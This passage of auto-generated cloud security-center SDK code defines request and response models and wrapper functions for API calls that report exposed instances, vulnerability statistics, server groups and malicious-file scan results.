    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeEventOnStage(request: DescribeEventOnStageRequest): DescribeEventOnStageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeEventOnStageWithOptions(request, runtime);
}

model DescribeExcludeSystemPathRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
}

model DescribeExcludeSystemPathResponseBody = {
  excludePaths?: [ 
    {
      os?: string(name='Os'),
      path?: string(name='Path'),
    }
  ](name='ExcludePaths'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeExcludeSystemPathResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExcludeSystemPathResponseBody(name='body'),
}

async function describeExcludeSystemPathWithOptions(request: DescribeExcludeSystemPathRequest, runtime: Util.RuntimeOptions): DescribeExcludeSystemPathResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExcludeSystemPath',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExcludeSystemPath(request: DescribeExcludeSystemPathRequest): DescribeExcludeSystemPathResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExcludeSystemPathWithOptions(request, runtime);
}

model DescribeExportInfoRequest {
  exportId?: long(name='ExportId'),
}

model DescribeExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount'),
  exportStatus?: string(name='ExportStatus'),
  fileName?: string(name='FileName'),
  id?: long(name='Id'),
  link?: string(name='Link'),
  message?: string(name='Message'),
  progress?: int32(name='Progress'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExportInfoResponseBody(name='body'),
}

async function describeExportInfoWithOptions(request: DescribeExportInfoRequest, runtime: Util.RuntimeOptions): DescribeExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExportInfo(request: DescribeExportInfoRequest): DescribeExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExportInfoWithOptions(request, runtime);
}

model DescribeExposedCheckWarningRequest {
  lang?: string(name='Lang'),
  typeName?: string(name='TypeName'),
  uuids?: string(name='Uuids'),
}

model DescribeExposedCheckWarningResponseBody = {
  count?: int32(name='Count'),
  requestId?: string(name='RequestId'),
  warningList?: [ 
    {
      riskId?: long(name='RiskId'),
      riskName?: string(name='RiskName'),
      subTypeAlias?: string(name='SubTypeAlias'),
      typeAlias?: string(name='TypeAlias'),
      uuid?: string(name='Uuid'),
    }
  ](name='WarningList'),
}

model DescribeExposedCheckWarningResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedCheckWarningResponseBody(name='body'),
}

async function describeExposedCheckWarningWithOptions(request: DescribeExposedCheckWarningRequest, runtime: Util.RuntimeOptions): DescribeExposedCheckWarningResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.typeName)) {
    query['TypeName'] = request.typeName;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedCheckWarning',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedCheckWarning(request: DescribeExposedCheckWarningRequest): DescribeExposedCheckWarningResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedCheckWarningWithOptions(request, runtime);
}

model DescribeExposedInstanceCriteriaRequest {
  value?: string(name='Value'),
}

model DescribeExposedInstanceCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name'),
      type?: string(name='Type'),
      values?: string(name='Values'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId'),
}

model DescribeExposedInstanceCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedInstanceCriteriaResponseBody(name='body'),
}

async function describeExposedInstanceCriteriaWithOptions(request: DescribeExposedInstanceCriteriaRequest, runtime: Util.RuntimeOptions): DescribeExposedInstanceCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedInstanceCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedInstanceCriteria(request: DescribeExposedInstanceCriteriaRequest): DescribeExposedInstanceCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedInstanceCriteriaWithOptions(request, runtime);
}

model DescribeExposedInstanceDetailRequest {
  uuid?: string(name='Uuid'),
}

model DescribeExposedInstanceDetailResponseBody = {
  exposedChains?: [ 
    {
      allVulList?: [ 
        {
          aliasName?: string(name='AliasName'),
          name?: string(name='Name'),
          necessity?: string(name='Necessity'),
          type?: string(name='Type'),
          uuid?: string(name='Uuid'),
        }
      ](name='AllVulList'),
      exposureComponent?: string(name='ExposureComponent'),
      exposureIp?: string(name='ExposureIp'),
      exposurePort?: string(name='ExposurePort'),
      exposureType?: string(name='ExposureType'),
      exposureTypeId?: string(name='ExposureTypeId'),
      groupNo?: string(name='GroupNo'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      realVulList?: [ 
        {
          aliasName?: string(name='AliasName'),
          name?: string(name='Name'),
          necessity?: string(name='Necessity'),
          type?: string(name='Type'),
          uuid?: string(name='Uuid'),
        }
      ](name='RealVulList'),
      regionId?: string(name='RegionId'),
      uuid?: string(name='Uuid'),
    }
  ](name='ExposedChains'),
  requestId?: string(name='RequestId'),
}

model DescribeExposedInstanceDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedInstanceDetailResponseBody(name='body'),
}

async function describeExposedInstanceDetailWithOptions(request: DescribeExposedInstanceDetailRequest, runtime: Util.RuntimeOptions): DescribeExposedInstanceDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedInstanceDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedInstanceDetail(request: DescribeExposedInstanceDetailRequest): DescribeExposedInstanceDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedInstanceDetailWithOptions(request, runtime);
}

model DescribeExposedInstanceListRequest {
  currentPage?: int32(name='CurrentPage'),
  exposureComponent?: string(name='ExposureComponent'),
  exposureIp?: string(name='ExposureIp'),
  exposurePort?: string(name='ExposurePort'),
  groupId?: long(name='GroupId'),
  healthStatus?: boolean(name='HealthStatus'),
  instanceId?: string(name='InstanceId'),
  instanceName?: string(name='InstanceName'),
  pageSize?: int32(name='PageSize'),
  vulStatus?: boolean(name='VulStatus'),
}

model DescribeExposedInstanceListResponseBody = {
  exposedInstances?: [ 
    {
      asapVulCount?: int32(name='AsapVulCount'),
      exploitHealthCount?: int32(name='ExploitHealthCount'),
      exposureComponent?: string(name='ExposureComponent'),
      exposureIp?: string(name='ExposureIp'),
      exposurePort?: string(name='ExposurePort'),
      exposureType?: string(name='ExposureType'),
      exposureTypeId?: string(name='ExposureTypeId'),
      groupId?: long(name='GroupId'),
      groupName?: string(name='GroupName'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      laterVulCount?: int32(name='LaterVulCount'),
      nntfVulCount?: int32(name='NntfVulCount'),
      regionId?: string(name='RegionId'),
      totalVulCount?: int32(name='TotalVulCount'),
      uuid?: string(name='Uuid'),
    }
  ](name='ExposedInstances'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeExposedInstanceListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedInstanceListResponseBody(name='body'),
}

async function describeExposedInstanceListWithOptions(request: DescribeExposedInstanceListRequest, runtime: Util.RuntimeOptions): DescribeExposedInstanceListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.exposureComponent)) {
    query['ExposureComponent'] = request.exposureComponent;
  }
  if (!Util.isUnset(request.exposureIp)) {
    query['ExposureIp'] = request.exposureIp;
  }
  if (!Util.isUnset(request.exposurePort)) {
    query['ExposurePort'] = request.exposurePort;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.healthStatus)) {
    query['HealthStatus'] = request.healthStatus;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.instanceName)) {
    query['InstanceName'] = request.instanceName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.vulStatus)) {
    query['VulStatus'] = request.vulStatus;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedInstanceList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedInstanceList(request: DescribeExposedInstanceListRequest): DescribeExposedInstanceListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedInstanceListWithOptions(request, runtime);
}

model DescribeExposedStatisticsResponseBody = {
  exposedAsapVulCount?: int32(name='ExposedAsapVulCount', description='The total number of high-risk vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='1'),
  exposedComponentCount?: int32(name='ExposedComponentCount', description='The total number of system components that are exposed on the Internet. The components include OpenSSL and OpenSSH.', example='7'),
  exposedInstanceCount?: int32(name='ExposedInstanceCount', description='The total number of servers that are exposed on the Internet.', example='100'),
  exposedIpCount?: int32(name='ExposedIpCount', description='The total number of IP addresses that are exposed on the Internet.', example='100'),
  exposedLaterVulCount?: int32(name='ExposedLaterVulCount', description='The total number of medium-risk vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='5'),
  exposedNntfVulCount?: int32(name='ExposedNntfVulCount', description='The total number of low-risk vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='0'),
  exposedPortCount?: int32(name='ExposedPortCount', description='The total number of ports that are exposed on the Internet.', example='6'),
  exposedWeekPasswordMachineCount?: int32(name='ExposedWeekPasswordMachineCount', description='The total number of system keys that are detected on your servers and are exposed on the Internet.', example='20'),
  gatewayAssetCount?: int32(name='GatewayAssetCount', description='The total number of gateway assets that are exposed on the Internet. The gateway assets include NAT gateways and Server Load Balancer (SLB) instances.', example='3'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4B897D10-B3CD-4A93-A5FA-591F3ED12A86'),
}

model DescribeExposedStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedStatisticsResponseBody(name='body'),
}

async function describeExposedStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeExposedStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeExposedStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedStatistics(): DescribeExposedStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedStatisticsWithOptions(runtime);
}

model DescribeExposedStatisticsDetailRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  statisticsType?: string(name='StatisticsType'),
  statisticsTypeGatewayType?: string(name='StatisticsTypeGatewayType'),
  statisticsTypeInstanceValue?: string(name='StatisticsTypeInstanceValue'),
}

model DescribeExposedStatisticsDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  statisticsDetails?: [ 
    {
      exposedCount?: int32(name='ExposedCount'),
      exposureComponent?: string(name='ExposureComponent'),
      exposureIp?: string(name='ExposureIp'),
      exposurePort?: string(name='ExposurePort'),
      exposureType?: string(name='ExposureType'),
      exposureTypeId?: string(name='ExposureTypeId'),
      exposureTypeInstanceName?: string(name='ExposureTypeInstanceName'),
      regionId?: string(name='RegionId'),
    }
  ](name='StatisticsDetails'),
}

model DescribeExposedStatisticsDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedStatisticsDetailResponseBody(name='body'),
}

async function describeExposedStatisticsDetailWithOptions(request: DescribeExposedStatisticsDetailRequest, runtime: Util.RuntimeOptions): DescribeExposedStatisticsDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.statisticsType)) {
    query['StatisticsType'] = request.statisticsType;
  }
  if (!Util.isUnset(request.statisticsTypeGatewayType)) {
    query['StatisticsTypeGatewayType'] = request.statisticsTypeGatewayType;
  }
  if (!Util.isUnset(request.statisticsTypeInstanceValue)) {
    query['StatisticsTypeInstanceValue'] = request.statisticsTypeInstanceValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedStatisticsDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedStatisticsDetail(request: DescribeExposedStatisticsDetailRequest): DescribeExposedStatisticsDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedStatisticsDetailWithOptions(request, runtime);
}

model DescribeFieldStatisticsRequest {
  machineTypes?: string(name='MachineTypes'),
  regionId?: string(name='RegionId'),
}

model DescribeFieldStatisticsResponseBody = {
  groupedFields?: {
    aliYunInstanceCount?: int32(name='AliYunInstanceCount'),
    awsInstanceCount?: int32(name='AwsInstanceCount'),
    exposedInstanceCount?: int32(name='ExposedInstanceCount'),
    generalAssetCount?: int32(name='GeneralAssetCount'),
    groupCount?: int32(name='GroupCount'),
    huaweiInstanceCount?: int32(name='HuaweiInstanceCount'),
    idcInstanceCount?: int32(name='IdcInstanceCount'),
    importantAssetCount?: int32(name='ImportantAssetCount'),
    instanceCount?: int32(name='InstanceCount'),
    instanceSyncTaskCount?: int32(name='InstanceSyncTaskCount'),
    newInstanceCount?: int32(name='NewInstanceCount'),
    noRiskInstanceCount?: int32(name='NoRiskInstanceCount'),
    notRunningStatusCount?: int32(name='NotRunningStatusCount'),
    offlineInstanceCount?: int32(name='OfflineInstanceCount'),
    outMachineInstanceCount?: int32(name='OutMachineInstanceCount'),
    pauseInstanceCount?: int32(name='PauseInstanceCount'),
    regionCount?: int32(name='RegionCount'),
    riskInstanceCount?: int32(name='RiskInstanceCount'),
    tencentInstanceCount?: int32(name='TencentInstanceCount'),
    testAssetCount?: int32(name='TestAssetCount'),
    tripartiteInstanceCount?: int32(name='TripartiteInstanceCount'),
    unKnowStatusInstanceCount?: int32(name='UnKnowStatusInstanceCount'),
    unprotectedInstanceCount?: int32(name='UnprotectedInstanceCount'),
    vpcCount?: int32(name='VpcCount'),
  }(name='GroupedFields'),
  requestId?: string(name='RequestId'),
}

model DescribeFieldStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeFieldStatisticsResponseBody(name='body'),
}

async function describeFieldStatisticsWithOptions(request: DescribeFieldStatisticsRequest, runtime: Util.RuntimeOptions): DescribeFieldStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeFieldStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeFieldStatistics(request: DescribeFieldStatisticsRequest): DescribeFieldStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeFieldStatisticsWithOptions(request, runtime);
}

model DescribeFrontVulPatchListRequest {
  info?: string(name='Info'),
  lang?: string(name='Lang'),
  operateType?: string(name='OperateType'),
  type?: string(name='Type'),
}

model DescribeFrontVulPatchListResponseBody = {
  frontPatchList?: [ 
    {
      patchList?: [ 
        {
          aliasName?: string(name='AliasName'),
          name?: string(name='Name'),
        }
      ](name='PatchList'),
      uuid?: string(name='Uuid'),
    }
  ](name='FrontPatchList'),
  requestId?: string(name='RequestId'),
}

model DescribeFrontVulPatchListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeFrontVulPatchListResponseBody(name='body'),
}

async function describeFrontVulPatchListWithOptions(request: DescribeFrontVulPatchListRequest, runtime: Util.RuntimeOptions): DescribeFrontVulPatchListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.info)) {
    query['Info'] = request.info;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeFrontVulPatchList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeFrontVulPatchList(request: DescribeFrontVulPatchListRequest): DescribeFrontVulPatchListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeFrontVulPatchListWithOptions(request, runtime);
}

model DescribeGroupStructRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DescribeGroupStructResponseBody = {
  groupFather?: int32(name='GroupFather', description='The parent node of the group.', example='958****'),
  groupFlag?: int32(name='GroupFlag', description='The type of the server group. Valid values:

*   **0**: the default group
*   **1**: other groups', example='0'),
  groupId?: long(name='GroupId', description='The ID of the server group.', example='958****'),
  groupIndex?: int32(name='GroupIndex', description='The sequence number.', example='1'),
  groupLevel?: int32(name='GroupLevel', description='The level of the application group.', example='2'),
  groupName?: string(name='GroupName', description='The name of the server group.', example='TestGroupName'),
  groups?: [ string ](name='Groups', description='An array that consists of child groups.'),
  machineNum?: int32(name='MachineNum', description='The number of servers in the group.', example='30'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9FBC6E47-7508-58C9-9E76-528E118C****'),
}

model DescribeGroupStructResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupStructResponseBody(name='body'),
}

async function describeGroupStructWithOptions(request: DescribeGroupStructRequest, runtime: Util.RuntimeOptions): DescribeGroupStructResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupStruct',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeGroupStruct(request: DescribeGroupStructRequest): DescribeGroupStructResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupStructWithOptions(request, runtime);
}

model DescribeGroupedContainerInstancesRequest {
  criteria?: string(name='Criteria'),
  currentPage?: int32(name='CurrentPage'),
  fieldValue?: string(name='FieldValue'),
  groupField?: string(name='GroupField'),
  logicalExp?: string(name='LogicalExp'),
  pageSize?: int32(name='PageSize'),
}

model DescribeGroupedContainerInstancesResponseBody = {
  groupedContainerInstanceList?: [ 
    {
      alarmCount?: int32(name='AlarmCount'),
      appName?: string(name='AppName'),
      clusterId?: string(name='ClusterId'),
      clusterName?: string(name='ClusterName'),
      clusterType?: string(name='ClusterType'),
      createTime?: long(name='CreateTime'),
      custerState?: string(name='CusterState'),
      hcCount?: int32(name='HcCount'),
      hostIp?: string(name='HostIp'),
      image?: string(name='Image'),
      imageDigest?: string(name='ImageDigest'),
      imageRepoName?: string(name='ImageRepoName'),
      imageRepoNamespace?: string(name='ImageRepoNamespace'),
      imageRepoTag?: string(name='ImageRepoTag'),
      imageUuid?: string(name='ImageUuid'),
      instanceCount?: int32(name='InstanceCount'),
      instanceId?: string(name='InstanceId'),
      namespace?: string(name='Namespace'),
      pod?: string(name='Pod'),
      podIp?: string(name='PodIp'),
      regionId?: string(name='RegionId'),
      riskInstanceCount?: int32(name='RiskInstanceCount'),
      riskLevel?: string(name='RiskLevel'),
      riskStatus?: string(name='RiskStatus'),
      vulCount?: int32(name='VulCount'),
    }
  ](name='GroupedContainerInstanceList'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeGroupedContainerInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedContainerInstancesResponseBody(name='body'),
}

async function describeGroupedContainerInstancesWithOptions(request: DescribeGroupedContainerInstancesRequest, runtime: Util.RuntimeOptions): DescribeGroupedContainerInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.groupField)) {
    query['GroupField'] = request.groupField;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedContainerInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeGroupedContainerInstances(request: DescribeGroupedContainerInstancesRequest): DescribeGroupedContainerInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedContainerInstancesWithOptions(request, runtime);
}

model DescribeGroupedInstancesRequest {
  currentPage?: int32(name='CurrentPage'),
  fieldValue?: string(name='FieldValue'),
  groupField?: string(name='GroupField'),
  lang?: string(name='Lang'),
  machineTypes?: string(name='MachineTypes'),
  noPage?: boolean(name='NoPage'),
  pageSize?: int32(name='PageSize'),
  vendor?: int32(name='Vendor'),
  vendors?: string(name='Vendors'),
}

model DescribeGroupedInstancesResponseBody = {
  instances?: [ 
    {
      asapVulInstanceCount?: long(name='AsapVulInstanceCount'),
      fieldAliasName?: string(name='FieldAliasName'),
      groupFlag?: int32(name='GroupFlag'),
      instanceCount?: string(name='InstanceCount'),
      riskInstanceCount?: string(name='RiskInstanceCount'),
      unProtectedInstanceCount?: string(name='UnProtectedInstanceCount'),
    }
  ](name='Instances'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeGroupedInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedInstancesResponseBody(name='body'),
}

async function describeGroupedInstancesWithOptions(request: DescribeGroupedInstancesRequest, runtime: Util.RuntimeOptions): DescribeGroupedInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.groupField)) {
    query['GroupField'] = request.groupField;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.noPage)) {
    query['NoPage'] = request.noPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  if (!Util.isUnset(request.vendors)) {
    query['Vendors'] = request.vendors;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeGroupedInstances(request: DescribeGroupedInstancesRequest): DescribeGroupedInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedInstancesWithOptions(request, runtime);
}

model DescribeGroupedMaliciousFilesRequest {
  clusterId?: string(name='ClusterId'),
  currentPage?: int32(name='CurrentPage'),
  fuzzyMaliciousName?: string(name='FuzzyMaliciousName'),
  imageDigest?: string(name='ImageDigest'),
  imageLayer?: string(name='ImageLayer'),
  imageTag?: string(name='ImageTag'),
  lang?: string(name='Lang'),
  levels?: string(name='Levels'),
  maliciousMd5?: string(name='MaliciousMd5'),
  pageSize?: string(name='PageSize'),
  repoId?: string(name='RepoId'),
  repoInstanceId?: string(name='RepoInstanceId'),
  repoName?: string(name='RepoName'),
  repoNamespace?: string(name='RepoNamespace'),
  repoRegionId?: string(name='RepoRegionId'),
  scanRange?: [ string ](name='ScanRange'),
}

model DescribeGroupedMaliciousFilesResponseBody = {
  groupedMaliciousFileResponse?: [ 
    {
      firstScanTimestamp?: long(name='FirstScanTimestamp'),
      imageCount?: long(name='ImageCount'),
      latestScanTimestamp?: long(name='LatestScanTimestamp'),
      level?: string(name='Level'),
      maliciousMd5?: string(name='MaliciousMd5'),
      maliciousName?: string(name='MaliciousName'),
      status?: int32(name='Status'),
    }
  ](name='GroupedMaliciousFileResponse'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

